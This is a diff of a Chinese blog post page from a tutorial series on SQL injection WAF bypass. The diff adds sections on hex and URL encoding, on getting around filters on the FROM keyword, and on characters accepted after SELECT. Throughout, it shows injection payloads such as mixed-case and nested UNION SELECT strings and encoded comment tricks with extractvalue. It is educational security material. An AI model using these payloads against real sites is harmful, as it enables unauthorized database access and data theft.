@@ -43,7 +43,7 @@ page.php?id =1 UNIunionON SELselectECT 1,2,3,4 ;
 使用编码
 URL编码普通的URL编码">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入练级攻略-7-绕过姿势之waf-(二)">
+<meta property="og:title" content="SQL注入练级攻略-7-绕过姿势之-(二)">
 <meta property="og:url" content="http://yoursite.com/2015/08/17/SQL注入练级攻略-7-绕过姿势-二/index.html">
 <meta property="og:site_name" content="FengGe">
 <meta property="og:description" content="大小写绕过最基本的的绕过，适用于过滤器对大小写敏感的场景
@@ -53,9 +53,9 @@ page.php?id =1 UNIunionON SELselectECT 1,2,3,4 ;
 也可以构造的更复杂视情况而定SeLSeselectleCTecT
 使用编码
 URL编码普通的URL编码">
-<meta property="og:updated_time" content="2015-08-20T01:32:13.171Z">
+<meta property="og:updated_time" content="2015-08-20T03:32:07.252Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入练级攻略-7-绕过姿势之waf-(二)">
+<meta name="twitter:title" content="SQL注入练级攻略-7-绕过姿势之-(二)">
 <meta name="twitter:description" content="大小写绕过最基本的的绕过，适用于过滤器对大小写敏感的场景
 page.php?id=1 UniOn sElEcT 1,2,3,4;
 替换关键字适用于过滤规则替换union select 等关键字的情况
@@ -72,7 +72,7 @@ URL编码普通的URL编码">
   };
 </script>
 
-  <title> SQL注入练级攻略-7-绕过姿势之waf-(二) | FengGe </title>
+  <title> SQL注入练级攻略-7-绕过姿势之-(二) | FengGe </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -211,7 +211,7 @@ URL编码普通的URL编码">
           
           
             
-              SQL注入练级攻略-7-绕过姿势之waf-(二)
+              SQL注入练级攻略-7-绕过姿势之-(二)
             
           
         </h1>
@@ -259,7 +259,15 @@ URL编码普通的URL编码">
 <p>  z.com/index.php?page_id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))<br>  //6e-&gt;n   6c-&gt;l  字母的十六进制编码，与ascii码一致，在python解释器中<br>  //python&gt; “admin”.encode(“hex”) #61646D696E<br>  //python&gt; “61646D696E”.decode(“hex”) #admin</p>
 </li>
 </ul>
-</span>
+<p>因为几乎所有的编码都会向下兼容ascii编码，所以在编码绕过的部分，每一个英文字母对应编码的部分应该是一致的，<br>但是我们可以通过改变输入的格式：<br>1.”\”对应”5c”,在5c前加%就是url编码，url编码被解码的过程中就被还原成了正常的sql语句。<br>2.在mysql中格式如0x61646D696E的形式标识一串字符，可以在where后作为判断，绕过过滤引号的情况</p>
+<h2 id="绕过关键字from">绕过关键字from</h2><pre><code>mysql&gt; <span class="keyword">select</span>+id+<span class="number">1</span>-<span class="number">2.</span><span class="keyword">from</span> admin;
+<span class="comment">//使用+-.将from连起来</span>
+mysql&gt; <span class="keyword">select</span>@^<span class="number">1.</span><span class="keyword">from</span> admin;
+</code></pre><h2 id="select后可以跟的字符以及as效果(不用as)">select后可以跟的字符以及as效果(不用as)</h2><pre><code>mysql&gt;<span class="keyword">select</span>-+!@<span class="number">1</span> <span class="keyword">from</span> admin;
+<span class="comment">// - + ! @在1和select之间都可以加</span>
+mysql&gt; <span class="keyword">select</span>@^<span class="number">1.</span><span class="keyword">from</span> admin;
+<span class="comment">//貌似是个特殊情况不知道什么原因使用这一套组合技能@~1.在from前可以没有空格，很牛逼。</span>
+</code></pre></span>
       
     </div>
 
@@ -310,7 +318,7 @@ URL编码普通的URL编码">
           <div class="comments" id="comments">
             
               <div class="ds-thread" data-thread-key="2015/08/17/SQL注入练级攻略-7-绕过姿势-二/"
-                   data-title="SQL注入练级攻略-7-绕过姿势之waf-(二)" data-url="http://yoursite.com/2015/08/17/SQL注入练级攻略-7-绕过姿势-二/">
+                   data-title="SQL注入练级攻略-7-绕过姿势之-(二)" data-url="http://yoursite.com/2015/08/17/SQL注入练级攻略-7-绕过姿势-二/">
               </div>
             
           </div>
@@ -350,7 +358,7 @@ URL编码普通的URL编码">
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">20</span>
+              <span class="site-state-item-count">21</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -417,7 +425,7 @@ URL编码普通的URL编码">
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#大小写绕过"><span class="nav-number">1.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#替换关键字"><span class="nav-number">2.</span> <span class="nav-text">替换关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用编码"><span class="nav-number">3.</span> <span class="nav-text">使用编码</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#大小写绕过"><span class="nav-number">1.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#替换关键字"><span class="nav-number">2.</span> <span class="nav-text">替换关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用编码"><span class="nav-number">3.</span> <span class="nav-text">使用编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过关键字from"><span class="nav-number">4.</span> <span class="nav-text">绕过关键字from</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#select后可以跟的字符以及as效果(不用as)"><span class="nav-number">5.</span> <span class="nav-text">select后可以跟的字符以及as效果(不用as)</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
